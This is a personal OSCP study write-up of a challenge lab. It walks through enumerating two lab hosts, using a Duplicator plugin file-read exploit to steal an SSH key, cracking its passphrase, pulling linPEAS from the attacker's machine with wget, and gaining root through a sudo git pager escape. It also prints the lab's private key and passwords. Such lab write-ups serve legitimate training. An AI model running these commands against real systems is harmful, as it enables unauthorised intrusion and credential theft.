---
title: Assembling the Pieces
date: 2024-04-024 06:29:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Assembling the Pieces tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Assembling the Pieces (Chellenge Lab 0)

In this scenario, the company BEYOND Finances has tasked us with conducting a penetration test of their IT infrastructure. The client wants to determine if an attacker can breach the perimeter and get domain admin privileges in the internal Active Directory (AD) environment. In this assessment, the client's goals for us are to obtain domain administrator privileges and access the domain controller.

```
WEBSRV1 192.168.155.244
MAILSRV1 192.168.155.242
```

Make a workspace for this test.

```console
kali@kali:~$ mkdir beyond

kali@kali:~$ cd beyond

kali@kali:~/beyond$ mkdir mailsrv1

kali@kali:~/beyond$ mkdir websrv1

kali@kali:~/beyond$ touch creds.txt
```

## Enumerating the Public Network


### MAILSRV1

```console
$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.155.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 16:21 EDT
Nmap scan report for 192.168.155.242
Host is up (0.054s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd                  // !!
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0           // !!
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp open  msrpc         Microsoft Windows RPC               // !!
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: NAMESPACE IDLE OK IMAP4rev1 RIGHTS=texkA0001 IMAP4 QUOTA completed CAPABILITY CHILDREN SORT ACL
445/tcp open  microsoft-ds?                                     // !!
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7s
| smb2-time: 
|   date: 2024-04-27T20:22:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.83 seconds
```

Based on this information, we can establish that the target machine is a Windows system running an IIS web server and a hMailServer.

We can research applications we don't know (like hMailServer) by browsing the application's web page.

To identify potential vulnerabilities in hMailServer, we can use a search engine to find CVEs and public exploits. However, as Nmap didn't discover a version number, we have to conduct a broader search. Unfortunately, the search didn't provide any meaningful results apart from some older CVEs.

Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps. While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems.

Next, browse to the web page of the IIS web server. (192.168.155.242:80 in browser). 

Try to identify directories and files by using gobuster.

```console
$ gobuster dir -u http://192.168.155.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```

Gobuster did not identify any pages, files, or directories.

We cannot use the mail server at this moment. If we identify valid credentials and targets later on in the penetration test, we could perhaps use the mail server to send a phishing email, for example.

### WEBSRV1

Enumerate the second target machine from the client's topology, WEBSRV1.

```console
$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.155.244
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 16:31 EDT
Nmap scan report for 192.168.155.244
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)     // !!
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))                          // !!
|_http-generator: WordPress 6.0.2
| http-title: BEYOND Finances &#8211; We provide financial freedom           // !!
|_Requested resource was http://192.168.155.244/main/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
```

The Nmap scan revealed only two open ports: 22 and 80.

Nmap fingerprinted the services as running an SSH service and HTTP service on the ports, respectively. the target is running on an Ubuntu Linux system. However, the banner provides much more detail with a bit of manual work. Let's copy the "OpenSSH 8.9p1 Ubuntu 3" string in to a search engine. The results contain a link to the Ubuntu Launchpad web page, which contains a list of OpenSSH version information mapped to specific Ubuntu releases. In our example, the version is mapped to Jammy Jellyfish, which is the version name for Ubuntu 22.04.

For port 22, we currently only have the option to perform a password attack. Because we don't have any username or password information, we should analyze other services first. Therefore, let's enumerate port 80 running Apache 2.4.52.

NOTE: We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer. As this will yield no actionable results, we'll skip it.

Browse to the webpaage (192.168.155.244:80). Because the Nmap scan provided the HTTP title BEYOND Finances, our chances of encountering a non-default page again are high.

If we review the web site, we'll notice it doesn't contain a menu bar or links to other pages. Let’s inspect the web page’s source code to determine the technology being used by right-clicking in our browser on Kali and selecting View Page Source. For a majority of frameworks and web solutions, such as CMS's, we can find artifacts and string indicators in the source code. We notice that the links contain the strings "wp-content" and "wp-includes". By entering these keywords in a search engine, we can establish that the page uses WordPress. To confirm this and potentially provide more information about the technology stack in use, we can use whatweb.

```console
$ whatweb http://192.168.155.244

http://192.168.155.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.155.244], RedirectLocation[http://192.168.155.244/main/], UncommonHeaders[x-redirect-by]                 
http://192.168.155.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.155.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]                                                                    
```

A review of the release history for WordPress indicates this version was released in August 2022 and at the time of writing this Module, it's the most current version. However, WordPress themes and plugins are written by the community and many vulnerabilities are improperly patched or are simply never fixed at all. This makes plugins and themes a great target for compromise. Scan with WPScan.

WPScan looks up component vulnerabilities in the WordPress Vulnerability Database,5 which requires an API token. A limited API key can be obtained for free by registering an account on the WPScan homepage.

```console
// use api token if you have it
$ wpscan --url http://192.168.155.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

$ cat websrv1/wpscan
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.155.244/wp-content/plugins/akismet/
 | Latest Version: 5.3.1
 | Last Updated: 2024-01-17T22:32:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.     // !!

[+] classic-editor
 | Location: http://192.168.155.244/wp-content/plugins/classic-editor/
 | Last Updated: 2023-11-09T16:38:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/classic-editor/readme.txt
 | [!] The version is out of date, the latest version is 1.6.3         // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/classic-editor/, status: 403
 |
 | Version: 1.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/classic-editor/readme.txt

[+] contact-form-7
 | Location: http://192.168.155.244/wp-content/plugins/contact-form-7/
 | Last Updated: 2024-02-05T04:49:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/contact-form-7/readme.txt
 | [!] The version is out of date, the latest version is 5.8.7        // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/contact-form-7/, status: 403
 |
 | Version: 5.6.3 (90% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.155.244/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.6.3
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/contact-form-7/readme.txt

[+] duplicator
 | Location: http://192.168.155.244/wp-content/plugins/duplicator/
 | Last Updated: 2024-02-06T17:24:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.8.1           // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/duplicator/readme.txt

[+] elementor
 | Location: http://192.168.155.244/wp-content/plugins/elementor/
 | Last Updated: 2024-02-07T15:41:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/elementor/readme.txt
 | [!] The version is out of date, the latest version is 3.19.2    // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/elementor/, status: 403
 |
 | Version: 3.7.7 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.155.244/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.7.7
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.155.244/wp-content/plugins/elementor/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.155.244/wp-content/plugins/elementor/readme.txt

[+] wordpress-seo
 | Location: http://192.168.155.244/wp-content/plugins/wordpress-seo/
 | Last Updated: 2024-02-06T08:57:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/wordpress-seo/readme.txt
 | [!] The version is out of date, the latest version is 22.0     // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/wordpress-seo/, status: 200
 |
 | Version: 19.7.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/wordpress-seo/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/wordpress-seo/readme.txt
```

Listing 6 shows that WPScan discovered six active plugins in the target WordPress instance: akismet, classic-editor, contact-form-7, duplicator, elementor, and wordpress-seo, some of which are out of date.

Instead of using WPScan's vulnerability database, let's use searchsploit to find possible exploits for vulnerabilities in the installed plugins.

```console
$ searchsploit duplicator

-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                                          | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forgery             | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                                    | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                                   | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read                    | php/webapps/50420.py        // !!
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)       | php/webapps/49288.rb        // !!
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download                         | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                                  | php/webapps/50993.txt
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forgery             | php/webapps/40908.html
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The output shows that there are two exploits matching the version of the Duplicator plugin on WEBSRV1. One is tagged with Metasploit, indicating that this exploit was developed for The Metasploit Framework.

## Attacking a Public Machine

### Initial Foothold

```console
$ searchsploit -x 50420

# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
# Date: October 16, 2021
# Exploit Author: nam3lum
# Vendor Homepage: https://wordpress.org/plugins/duplicator/
# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
# Version: 1.3.26
# Tested on: Ubuntu 16.04
# CVE : CVE-2020-11738

import requests as re
import sys

if len(sys.argv) != 3:
        print("Exploit made by nam3lum.")
        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
        exit()

arg = sys.argv[1]
file = sys.argv[2]
```

The Python code exploits the vulnerability tracked as CVE-2020-11738.

```console
$ cd websrv1

$ searchsploit -m 50420
Copied to: /home/kali/beyond/websrv1/50420.py

$ python3 50420.py http://192.168.155.244 /etc/passwd
...
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```

Add the creds for the user accounts to creds.txt.

There are several files we can attempt to retrieve via Directory Traversal in order to obtain access to a system. One of the most common methods is to retrieve an SSH private key configured with permissions that are too open.

```console
// try marcus
$ python3 50420.py http://192.168.155.244 /home/marcus/.ssh/id_rsa
Invalid installer file name!!

// try daniela
$ python3 50420.py http://192.168.155.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----

$ nano id_rsa
// copy daniela's key in this file

$ chmod 600 id_rsa

$ ssh -i id_rsa daniela@192.168.155.244
Enter passphrase for key 'id_rsa': 
```

The SSH key is protected by a passphrase... Try to crack it.

```console
$ ssh2john id_rsa > ssh.hash

$ john --wordlist=/home/kali/Desktop/oscp/rockyou.txt ssh.hash
tequieromucho    (id_rsa)     

$ ssh -i id_rsa daniela@192.168.155.244
Enter passphrase for key 'id_rsa':  tequieromucho

daniela@websrv1:~$ 
```

Add the password that you cracked to creds.txt!!!

We have access to our first target.

### A Link to the Past

Let's use the linPEAS automated Linux enumeration script to obtain a broad variety of information and identify any potential low hanging fruit.

```console
kali/beyond/websrv1$ cp /usr/share/peass/linpeas/linpeas.sh .

kali/beyond/websrv1$ python3 -m http.server 80

// use kali ip in below cmd

daniela@websrv1:~$ wget http://192.168.45.158/linpeas.sh
--2024-04-27 21:06:35--  http://192.168.45.158/linpeas.sh
Connecting to 192.168.45.158:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 853290 (833K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                      100%[=====================================================>] 833.29K  2.42MB/s    in 0.3s    

2024-04-27 21:06:35 (2.42 MB/s) - ‘linpeas.sh’ saved [853290/853290]

// make executable

daniela@websrv1:~$ chmod a+x ./linpeas.sh

daniela@websrv1:~$ ./linpeas.sh
```

Let's review the results.

System Information:

```
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            
Linux version 5.15.0-50-generic (buildd@lcy02-amd64-086) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #56-Ubuntu SMP Tue Sep 20 13:23:26 UTC 2022
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
```

Interfaces:

```
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                           
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:bf:80:a3 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.155.244/24 brd 192.168.155.255 scope global ens192
       valid_lft forever preferred_lft forever
```

The above shows only one network interface apart from the loopback interface. This means that the target machine is not connected to the internal network and we cannot use it as a pivot point.

Since we have already enumerated MAILSRV1 without any actionable results and this machine is not connected to the internal network, we have to discover sensitive information, such as credentials, to get a foothold in the internal network. To obtain files and data from other users and the system, we'll make elevating our privileges our priority.

Sudo:

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              
Matching Defaults entries for daniela on websrv1:                                                                             
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
```

Daniela can run /usr/bin/git with sudo privileges without entering a password.

Finish reviewing the linPEAS results before we leverage that finding.

WordPress Files:

```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php                                             
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
```

Save this password to creds.txt.

Another interesting aspect of this finding is the path displayed starts with /srv/www/wordpress/. The WordPress instance is not installed in /var/www/html where web applications are commonly found on Debian-based Linux systems. While this is not an actionable result, we should keep it in mind for future steps.

GitHub Files:

```
╔══════════╣ Analyzing Github Files (limit 70)
                                                                                                                              
drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git

```

We can assume that Git is used as the version control system for the WordPress instance. Reviewing the commits of the Git repository may allow us to identify changes in configuration data and sensitive information such as passwords.

The directory is owned by root and is not readable by other users. However, we can leverage sudo to use Git commands in a privileged context and therefore search the repository for sensitive information.

For now, let's skip the rest of the linPEAS output and summarize what information and potential privilege escalation vectors we've gathered so far.


WEBSRV1 runs Ubuntu 22.04 and is not connected to the internal network. The sudoers file contains an entry allowing daniela to run /usr/bin/git with elevated privileges without providing a password. In addition, we learned that the WordPress directory is a Git repository. Finally, we obtained a clear-text password in the database connection settings for WordPress.

Based on this information we can define three potential privilege escalation vectors:

    1. Abuse sudo command /usr/bin/git
    2. Use sudo to search the Git repository
    3. Attempt to access other users with the WordPress database password

The most promising vector at the moment is to abuse the sudo command /usr/bin/git because we don't have to enter a password. Most commands that run with sudo can be abused to obtain an interactive shell with elevated privileges. Most commands that run with sudo can be abused to obtain an interactive shell with elevated privileges.

To find potential abuses when a binary such as git is allowed to run with sudo, we can consult [GTFOBins](https://gtfobins.github.io/). Search for git. Find the git > Sudo secition. Try the first two.

```console
daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
sudo: sorry, you are not allowed to set the following environment variables: PAGER

daniela@websrv1:~$ sudo git -p help config

// to execute code through the pager, we can enter ! followed by a command or path to an executable file.

!/bin/bash
root@websrv1:/home/daniela#  whoami
root
```

We escalated our privileges.

Armed with root privileges, we'll continue enumerating the system. Before doing so, let's search the Git repository for sensitive information first.

```console
root@websrv1:/home/daniela# cd /srv/www/wordpress/

root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean

root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit
```

One is labeled as initial commit and one as Removed staging script and internal network access. That's quite interesting as it indicates that the machine previously had access to the internal network. Use git show, which shows differences between commits.

```console
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1

root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644    // !!
index 25667c7..0000000
--- a/fetch_current.sh      // !!
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash                // !!
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/  // !!
```

New creds! Add them to creds.txt.

NOTE: In a real assessment, we should run linPEAS again, once we have obtained privileged access to the system. Because the tool can now access files of other users and the system, it may discover sensitive information and data that wasn't accessible when running as daniela.

## Gaining Access to the Internal Network
